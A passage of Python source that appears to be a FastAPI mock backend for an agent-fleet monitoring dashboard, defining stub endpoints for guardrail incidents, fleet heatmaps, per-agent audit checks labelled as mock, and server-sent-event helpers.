@app.post("/guardrail/{incident_id}/prove")
async def guardrail_prove(incident_id: str) -> dict[str, Any]:
    return mock_prove(incident_id)


@app.post("/guardrail/{incident_id}/approve")
async def guardrail_approve(incident_id: str) -> dict[str, Any]:
    return mock_approve(incident_id)


@app.get("/fleet/heatmap")
async def fleet_heatmap(hours: int = 72) -> dict[str, Any]:
    return mock_heatmap(hours)


@app.get("/fleet/top")
async def fleet_top(minutes: int = 60, limit: int = 10) -> list[dict[str, Any]]:
    return mock_top(minutes, limit)


@app.get("/audit/verify/{agent_id}")
async def audit_verify(agent_id: str) -> dict[str, Any]:
    n = sum(1 for e in S.events if e["agent_id"] == agent_id)  # mock: ring-buffer count, no hash chain here
    return {"agent_id": agent_id, "events": n, "intact": True, "first_break_ts_ms": None, "mock": True}


@app.post("/guild/run")
async def guild_run() -> JSONResponse:
    return JSONResponse(status_code=503, content={"detail": "guild trigger not configured", "mock": True})


def _sse(msg: dict[str, Any]) -> dict[str, str]:
    return {"event": msg["type"], "id": str(msg["seq"]), "data": json.dumps(msg)}


async def _json(request: Request) -> dict[str, Any]:
    try:
        body = await request.json()
    except Exception:
        return {}
    return body if isinstance(body, dict) else {}
